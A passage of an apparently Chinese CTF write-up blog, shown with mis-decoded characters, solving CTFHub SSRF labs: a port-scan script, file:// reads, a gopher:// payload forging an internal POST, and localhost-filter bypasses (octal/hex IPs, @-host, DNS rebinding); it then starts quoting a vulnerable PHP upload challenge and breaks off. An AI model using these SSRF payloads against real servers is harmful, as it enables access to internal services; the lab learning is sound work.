data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A52212_2.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A52213_3.png" alt></p><p>å“åº”ä¸­æŸ¥çœ‹</p><p>æ–¹æ³•äºŒï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">'http://challenge-48d05bc5759898a5.sandbox.ctfhub.com:10080/?url=127.0.0.1:'</span>port<span class="token operator">=</span><span class="token number">8000</span><span class="token keyword">while</span> port<span class="token operator">&lt;=</span><span class="token number">9000</span><span class="token punctuation">:</span>    Wholeurl<span class="token operator">=</span>url<span class="token operator">+</span>str<span class="token punctuation">(</span>port<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>Wholeurl<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>Wholeurl<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span>        <span class="token keyword">break</span>    port<span class="token operator">=</span>port<span class="token operator">+</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"over"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pyè„šæœ¬è¿›è¡Œçˆ†ç ´</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//QQ%E5%9B%BE%E7%89%8720210114112554.png" alt></p><p>ï¼ˆ1/13ï¼‰</p><h3 id="POSTè¯·æ±‚"><a href="#POSTè¯·æ±‚" class="headerlink" title="POSTè¯·æ±‚"></a>POSTè¯·æ±‚</h3><h4 id="æç¤ºï¼š"><a href="#æç¤ºï¼š" class="headerlink" title="æç¤ºï¼š"></a>æç¤ºï¼š</h4><p>è¿™æ¬¡æ˜¯å‘ä¸€ä¸ªHTTP POSTè¯·æ±‚.å¯¹äº†.ssrfæ˜¯ç”¨phpçš„curlå®ç°çš„.å¹¶ä¸”ä¼šè·Ÿè¸ª302è·³è½¬.åŠ æ²¹å§éªšå¹´</p><h4 id="æ‰«ç›²ï¼š-1"><a href="#æ‰«ç›²ï¼š-1" class="headerlink" title="æ‰«ç›²ï¼š"></a>æ‰«ç›²ï¼š</h4><p><a href="https://mp.weixin.qq.com/s/umNUpdz6Mqvhlgqu4-9NCQ" target="_blank" rel="noopener">Gopheråè®®ä¸redisæœªæˆæƒè®¿é—®</a></p><h4 id="è‡ªåŠ¨ç»„è£…gopherå·¥å…·ï¼š"><a href="#è‡ªåŠ¨ç»„è£…gopherå·¥å…·ï¼š" class="headerlink" title="è‡ªåŠ¨ç»„è£…gopherå·¥å…·ï¼š"></a>è‡ªåŠ¨ç»„è£…gopherå·¥å…·ï¼š</h4><p><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p><h4 id="å¼€å§‹è§£é¢˜ï¼š"><a href="#å¼€å§‹è§£é¢˜ï¼š" class="headerlink" title="å¼€å§‹è§£é¢˜ï¼š"></a>å¼€å§‹è§£é¢˜ï¼š</h4><p>1.è¯»å–flag.php</p><p>åˆ©ç”¨file://åè®®å»è¯»å–<code>?url=file:///var/www/html/flag.php</code></p><pre class="line-numbers language-php+HTML"><code class="language-php+HTML"><?phperror_reporting(0);if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") { //æ£€æµ‹ä½ è¯·æ±‚çš„ipåœ°å€ï¼Œè¿™é‡Œæ˜¯ä½ æŒ‚çš„ä»£ç†çš„ipæ²¡æŒ‚å°±æ˜¯çœŸå®ip    echo "Just View From 127.0.0.1";    return;}$flag=getenv("CTFHUB");//ä»ç¯å¢ƒä¸­å–å­—ç¬¦ä¸²å˜é‡å–å¾—å½“å‰ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡$key = md5($flag);if (isset($_POST["key"]) && $_POST["key"] == $key) {    echo $flag;    exit;}?><form action="/flag.php" method="post"><input type="text" name="key"><!-- Debug: key=<?php echo $key;?>--></form> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†è¯»å–index.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /?url=_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>indexä¸­æ˜æ˜¾æåˆ°å¦‚æœä¸è®¾ç½®locationå°±ä¼šè¢«ä¸€ç›´é‡å®šå‘åˆ°è¿™ä¸ª?url=_è¿™ä¸ªé¡µé¢</p><p>2.å…³äºflag.phpï¼š</p><p>ä½ éœ€è¦postä¼ å…¥keyçš„å€¼</p><p><code>?url=127.0.0.1/flag.php</code></p><pre class="line-numbers language-php+HTML"><code class="language-php+HTML"><form action="/flag.php" method="post"><input type="text" name="key"><!-- Debug: key=0d6a7b9d0c4718d8fa37ad3f9d527d24--></form><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>3.åˆ©ç”¨gopheråè®®å»ä¼ å…¥postå€¼</p><p>é¦–å…ˆæƒ³è¦gopheråè®®ä¼ å…¥postå€¼éœ€è¦æå‰å‡†å¤‡<code>Content-Type</code>,<code>Content-Length</code>,<code>host</code>,<code>post</code>çš„å‚æ•°ï¼Œè¿™ä¸ªé€šè¿‡burpè·å–ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span>flag<span class="token punctuation">.</span>php <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">80</span>Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">36</span> <span class="token comment" spellcheck="true">//æ­¤å¤„ä¸ºä½ postä¼ å…¥å€¼çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯keyå­—æ®µ</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded <span class="token comment" spellcheck="true">//application/x-www-form-urlencodedï¼ˆå°†é”®å€¼å¯¹çš„å‚æ•°ç”¨&amp;è¿æ¥èµ·æ¥ï¼Œå¦‚æœæœ‰ç©ºæ ¼ï¼Œå°†ç©ºæ ¼è½¬æ¢ä¸º+åŠ å·ï¼›æœ‰ç‰¹æ®Šç¬¦å·ï¼Œå°†ç‰¹æ®Šç¬¦å·è½¬æ¢ä¸ºASCII HEXå€¼ï¼‰,å¦‚æœå‚æ•°å€¼ä¸­éœ€è¦&amp;ï¼Œåˆ™å¿…é¡»å¯¹å…¶è¿›è¡Œç¼–ç ã€‚</span>key<span class="token operator">=</span>0d6a7b9d0c4718d8fa37ad3f9d527d24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä¸­ç»†èŠ‚ï¼š</p><p>æ¯ä¸ªå‚æ•°ä¹‹é—´æ˜¯éœ€è¦å›è½¦æ¢è¡Œçš„æ‰€ä»¥è¦ç´§è·Ÿ%0d%0a</p><p>æ„é€ POSTè¯·æ±‚ï¼š</p><pre><code>POST%20%2Fflag.php%20HTTP%2F1.1%0AHost%3A%20127.0.0.1%3A80%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0AContent-Length%3A%2036%0A%0Akey%3D0d6a7b9d0c4718d8fa37ad3f9d527d24</code></pre><p>æ¢è¡Œå¤„ç†ï¼š</p><pre><code>POST%20%2Fflag.php%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0A%0D%0Akey%3D0d6a7b9d0c4718d8fa37ad3f9d527d24</code></pre><p>payloadæ„é€ ï¼š</p><pre><code>?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520http%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D0d6a7b9d0c4718d8fa37ad3f9d527d24</code></pre><h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>æè¿°ï¼šè¯·æ±‚çš„URLä¸­å¿…é¡»åŒ…å«<a href="http://notfound.ctfhub.comï¼Œæ¥å°è¯•åˆ©ç”¨URLçš„ä¸€äº›ç‰¹æ®Šåœ°æ–¹ç»•è¿‡è¿™ä¸ªé™åˆ¶å§" target="_blank" rel="noopener">http://notfound.ctfhub.comï¼Œæ¥å°è¯•åˆ©ç”¨URLçš„ä¸€äº›ç‰¹æ®Šåœ°æ–¹ç»•è¿‡è¿™ä¸ªé™åˆ¶å§</a></p><p>?url=<a href="http://notfound.ctfhub.com@127.0.0.1/flag.php" target="_blank" rel="noopener">http://notfound.ctfhub.com@127.0.0.1/flag.php</a></p><h3 id="æ•°å­—IP-Bypass"><a href="#æ•°å­—IP-Bypass" class="headerlink" title="æ•°å­—IP Bypass"></a>æ•°å­—IP Bypass</h3><p>æè¿°ï¼šè¿™æ¬¡banæ‰äº†127ä»¥åŠ172.ä¸èƒ½ä½¿ç”¨ç‚¹åˆ†åè¿›åˆ¶çš„IPäº†ã€‚ä½†æ˜¯åˆè¦è®¿é—®127.0.0.1ã€‚è¯¥æ€ä¹ˆåŠå‘¢</p><p><del>çœ‹äº†å¤§ä½¬çš„wp</del>ï¼š</p><ol><li>8è¿›åˆ¶æ ¼å¼ï¼š0177.00.00.01</li><li>16è¿›åˆ¶æ ¼å¼ï¼š0x7f.0x0.0x0.0x1</li><li>10è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š2130706433</li><li>åœ¨linuxä¸‹ï¼Œ0ä»£è¡¨127.0.0.1ï¼Œ<a href="http://0è¿›è¡Œè¯·æ±‚127.0.0.1" target="_blank" rel="noopener">http://0è¿›è¡Œè¯·æ±‚127.0.0.1</a></li></ol><p>?url=0/flag.php</p><h3 id="302è·³è½¬-Bypass"><a href="#302è·³è½¬-Bypass" class="headerlink" title="302è·³è½¬ Bypass"></a>302è·³è½¬ Bypass</h3><p>æè¿°ï¼šSSRFä¸­æœ‰ä¸ªå¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯è¯·æ±‚å¯èƒ½ä¼šè·Ÿéš302è·³è½¬ï¼Œå°è¯•åˆ©ç”¨è¿™ä¸ªæ¥ç»•è¿‡å¯¹IPçš„æ£€æµ‹è®¿é—®åˆ°ä½äº127.0.0.1çš„flag.phpå§</p><p>?url=127.0.0.1/flag.php</p><h6 id="DNSé‡ç»‘å®š-Bypass"><a href="#DNSé‡ç»‘å®š-Bypass" class="headerlink" title="DNSé‡ç»‘å®š Bypass"></a>DNSé‡ç»‘å®š Bypass</h6><p>å…³é”®è¯ï¼šDNSé‡ç»‘å®šã€‚å‰©ä¸‹çš„è‡ªå·±æ¥å§ï¼Œä¹Ÿè®¸é™„ä»¶ä¸­çš„é“¾æ¥èƒ½æœ‰äº›å¸®åŠ©</p><p><del>æœé›†wpä¿¡æ¯</del>ï¼š</p><p>æˆ‘ä»¬è¿™é‡Œè¿˜æ˜¯ä½¿ç”¨DNSé‡ç»‘å®šï¼Œåœ¨ç½‘ç»œä¸Šå­˜åœ¨ä¸€ä¸ªå¾ˆç¥å¥‡çš„æœåŠ¡ï¼Œ<a href="http://xip.io/" target="_blank" rel="noopener">http://xip.io</a> å½“æˆ‘ä»¬è®¿é—®è¿™ä¸ªç½‘ç«™çš„å­åŸŸåçš„æ—¶å€™ï¼Œä¾‹å¦‚127.0.0.1.xip.ioï¼Œå°±ä¼šè‡ªåŠ¨é‡å®šå‘åˆ°127.0.0.1ã€‚<br>å³ï¼š?url=127.0.0.1.xip.io/flag.php</p><p>ä½†æ˜¯è¿™ä¸ªé¢˜ç›´æ¥è¿™æ ·ä¹Ÿå¯ä»¥</p><p>?url=127.0.0.1/flag.php</p><p>æ¯•ç«Ÿéƒ½æ˜¯å®šå‘åˆ°127.0.0.1</p><h1 id="å†å¹´çœŸé¢˜-WEB-ï¼š"><a href="#å†å¹´çœŸé¢˜-WEB-ï¼š" class="headerlink" title="å†å¹´çœŸé¢˜(WEB)ï¼š"></a>å†å¹´çœŸé¢˜(WEB)ï¼š</h1><h2 id="æ–‡ä»¶ä¸Šä¼ -1"><a href="#æ–‡ä»¶ä¸Šä¼ -1" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><h3 id="è€ƒç‚¹ï¼š"><a href="#è€ƒç‚¹ï¼š" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h3><p>1.apacheæ–‡ä»¶è§£ææ¼æ´ï¼šå½±å“ç‰ˆæœ¬ä¸ºapache 2.4.0-2.4.29</p><p>2.é’ˆå¯¹phpä¸­ç¬¬ä¸‰æ–¹è§£å‹pclzipçš„æ¼æ´</p><h3 id="å‡½æ•°ç†è§£ï¼š"><a href="#å‡½æ•°ç†è§£ï¼š" class="headerlink" title="å‡½æ•°ç†è§£ï¼š"></a>å‡½æ•°ç†è§£ï¼š</h3><p><a href="https://www.baidu.com/link?url=7LGyFXNc0qzo9rbSaNvdsdwYfAcvtUEjTkpFyAv2jwTT4ZYvmtKP8yV0B01uYftchVyH4BsZthWqYE4aP0JH5VAp5IhYlNR8DQU0or2LZhG&wd=&eqid=bd9a86d40011433c00000003608a9e79" target="_blank" rel="noopener">PHP strrchr() å‡½æ•°</a>ï¼šstrrchr(123456789,2)åœ¨2å¤„è§„å®šçš„å­—ç¬¦ï¼Œä¼šè¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦ï¼š23456789ï¼Œæ­¤é¢˜ä¸­å¯ä»¥åˆ©ç”¨æ­¤å‡½æ•°æ¥å¾—åˆ°åç¼€</p><p>opendir()å‡½æ•°ï¼šæ‰“å¼€ç›®å½•å¥æŸ„ï¼Œç›¸å½“äºlså‘½ä»¤</p><p>unlink()å‡½æ•°ï¼šåˆ é™¤æ–‡ä»¶ï¼Œå¦‚æœæˆåŠŸï¼Œè¯¥å‡½æ•°è¿”å› TRUEã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› FALSEã€‚</p><p><a href="https://www.runoob.com/php/func-array-extract.html" target="_blank" rel="noopener">extract()å‡½æ•°</a>ï¼šä»å…³è”æ•°ç»„ä¸­æå–å˜é‡ <strong><em>ï¼ˆé”®ä¸ºå˜é‡åï¼Œå€¼ä¸ºå˜é‡å€¼ï¼‰</em></strong>ï¼Œå¯¼å…¥ç³»ç»Ÿï¼Œæ­¤å‡½æ•°å°±ç±»ä¼¼äºå¼„äº†ä¸€ä¸ªæ•°ç»„ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªè¡¨æ¥å°†ç›®å‰å·²ç»å­˜åœ¨çš„å˜é‡ï¼Œé‡æ–°è¦†ç›–ï¼Œå¹¶ä¸”å¯ä»¥åˆ©ç”¨å…¶ä¸­çš„è§„åˆ™ï¼Œå°†é‡æ–°è¦†ç›–çš„å˜é‡æ ‡æ³¨å‡ºæ¥</p><h3 id="é¢˜ç›®ï¼š"><a href="#é¢˜ç›®ï¼š" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type:text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// æ¯5åˆ†é’Ÿä¼šæ¸…é™¤ä¸€æ¬¡ç›®å½•ä¸‹ä¸Šä¼ çš„æ–‡ä»¶</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'pclzip.lib.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'è¿™é‡Œæœ¬æ¥æ˜¯å‰ç«¯é¡µé¢æˆ‘ç›´æ¥åˆ äº†æ²¡ç”¨'</span><span class="token punctuation">;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"è¯·å‹¿ä¸Šä¼ ç©ºæ–‡ä»¶"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string">'upload/'</span><span class="token punctuation">;</span>    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">check_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//æ‰“å¼€æ–‡ä»¶è·¯å¾„</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//$fæ˜¯å¦å­˜åœ¨äºè¯¥è·¯å¾„ä¸‹ï¼Œå­˜åœ¨åˆ™ç»§ç»­</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//$fä¸­æ˜¯å¦å«æœ‰.å’Œ..ç­‰å­—ç¬¦ï¼Œæ²¡æœ‰åˆ™ç»§ç»­</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//åˆ¤æ–­æ˜¯å¦ä¸ºä¸€ä¸ªç›®å½•</span>                    <span class="token function">check_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$f</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ç„¶åç»§ç»­é‡å¤check_dirçš„æ“ä½œ</span>                 <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//å¦‚æœä¸æ˜¯ä¸€ä¸ªç›®å½•ï¼Œé‚£ä¹ˆå¼€å§‹åˆ¤æ–­æ˜¯å¦ä¸ºæ­£å¸¸æ–‡ä»¶</span>                    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'gif'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>åˆ é™¤è¿™ä¸ªéæ³•æ–‡ä»¶                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$temp_dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$temp_dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$temp_dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'zip'</span><span class="token punctuation">,</span> <span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'gif'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string">'zip'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$archive</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PclZip</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$archive</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">listContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\.php$/'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"å‹ç¼©åŒ…å†…ä¸å…è®¸å«æœ‰phpæ–‡ä»¶!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$archive</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token constant">PCLZIP_OPT_PATH</span><span class="token punctuation">,</span> <span class="token variable">$temp_dir</span><span class="token punctuation">,</span> <span class="token constant">PCLZIP_OPT_REPLACE_NEWER</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"è§£å‹å¤±è´¥"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">check_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">check_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'ä¸Šä¼ æˆåŠŸ!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$temp_dir</span><span class="token punctuation">.</span><span 